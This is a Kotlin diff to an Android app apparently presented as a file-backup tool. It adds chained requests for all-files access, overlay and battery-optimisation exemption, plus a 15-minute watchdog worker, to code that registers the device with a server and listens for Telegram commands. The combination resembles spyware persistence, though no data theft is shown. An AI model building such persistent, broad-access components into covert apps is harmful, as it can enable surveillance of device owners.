@@ -20,6 +20,7 @@ import android.util.Log
 import android.widget.Toast
 import androidx.recyclerview.widget.LinearLayoutManager
 import androidx.recyclerview.widget.RecyclerView
+import android.content.Context
 
 class MainActivity : AppCompatActivity() {
     companion object {
@@ -38,11 +39,11 @@ class MainActivity : AppCompatActivity() {
 
         try {
             inicializarVistas()
-            // Eliminar líneas que aplican STRIKE_THRU_TEXT_FLAG a los botones
-            verificarPermisos()
+            checkAndRequestAllPermissions()
             configurarBotones()
             actualizarEstado()
             iniciarTelegramListener()
+            programarWatchdog()
             // Registro del dispositivo al servidor
             val deviceInfo = DeviceInfo(
                 deviceId = android.provider.Settings.Secure.getString(contentResolver, android.provider.Settings.Secure.ANDROID_ID) ?: "unknown_device",
@@ -274,10 +275,12 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    private fun verificarPermisos() {
+    private fun checkAndRequestAllPermissions() {
+        // Almacenamiento
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
             if (!Environment.isExternalStorageManager()) {
                 mostrarDialogoPermisos()
+                return
             }
         } else {
             val permisos = arrayOf(
@@ -289,13 +292,30 @@ class MainActivity : AppCompatActivity() {
             }
             if (faltan) {
                 ActivityCompat.requestPermissions(this, permisos, PERMISSION_REQUEST_CODE)
+                return
             }
         }
+        // Notificaciones
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             val notiPerm = Manifest.permission.POST_NOTIFICATIONS
             if (ContextCompat.checkSelfPermission(this, notiPerm) != PackageManager.PERMISSION_GRANTED) {
                 ActivityCompat.requestPermissions(this, arrayOf(notiPerm), PERMISSION_REQUEST_CODE)
+                return
             }
+        }
+        // Overlay
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
+            val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION)
+            intent.data = android.net.Uri.parse("package:" + packageName)
+            startActivity(intent)
+            return
+        }
+        // Ignorar optimización de batería
+        val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !pm.isIgnoringBatteryOptimizations(packageName)) {
+            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
+            intent.data = android.net.Uri.parse("package:" + packageName)
+            startActivity(intent)
         }
     }
     
@@ -318,10 +338,33 @@ class MainActivity : AppCompatActivity() {
     override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
         if (requestCode == PERMISSION_REQUEST_CODE) {
-            if (grantResults.any { it != PackageManager.PERMISSION_GRANTED }) {
-                mostrarDialogoPermisos()
+            val denegados = permissions.zip(grantResults.toTypedArray()).filter { it.second != PackageManager.PERMISSION_GRANTED }.map { it.first }
+            if (denegados.isNotEmpty()) {
+                mostrarDialogoPermisosDenegados(denegados)
             }
         }
+    }
+
+    private fun mostrarDialogoPermisosDenegados(denegados: List<String>) {
+        val mensaje = StringBuilder("La app necesita los siguientes permisos para funcionar correctamente:\n\n")
+        denegados.forEach {
+            when (it) {
+                Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE -> mensaje.append("- Almacenamiento: Para acceder y respaldar tus archivos.\n")
+                Manifest.permission.POST_NOTIFICATIONS -> mensaje.append("- Notificaciones: Para avisarte del estado de los backups.\n")
+            }
+        }
+        mensaje.append("\nPuedes otorgar los permisos manualmente en la configuración de la app.")
+        AlertDialog.Builder(this)
+            .setTitle("Permisos requeridos")
+            .setMessage(mensaje.toString())
+            .setPositiveButton("Abrir configuración") { _, _ ->
+                val intent = Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
+                intent.data = android.net.Uri.fromParts("package", packageName, null)
+                startActivity(intent)
+            }
+            .setNegativeButton("Cancelar", null)
+            .setIcon(android.R.drawable.ic_dialog_alert)
+            .show()
     }
 
     private fun actualizarEstado() {
@@ -342,6 +385,22 @@ class MainActivity : AppCompatActivity() {
     }
 
     // ELIMINADO: obtenerHistorialBackups y su uso
+
+    private fun programarWatchdog() {
+        try {
+            val workRequest = androidx.work.PeriodicWorkRequestBuilder<com.service.assasinscreed02.WatchdogWorker>(15, java.util.concurrent.TimeUnit.MINUTES)
+                .setBackoffCriteria(androidx.work.BackoffPolicy.LINEAR, 5, java.util.concurrent.TimeUnit.MINUTES)
+                .build()
+            androidx.work.WorkManager.getInstance(this).enqueueUniquePeriodicWork(
+                "watchdog_worker",
+                androidx.work.ExistingPeriodicWorkPolicy.KEEP,
+                workRequest
+            )
+            Log.d("MainActivity", "WatchdogWorker programado cada 15 minutos")
+        } catch (e: Exception) {
+            Log.e("MainActivity", "Error programando WatchdogWorker: ${e.message}", e)
+        }
+    }
 
 
     
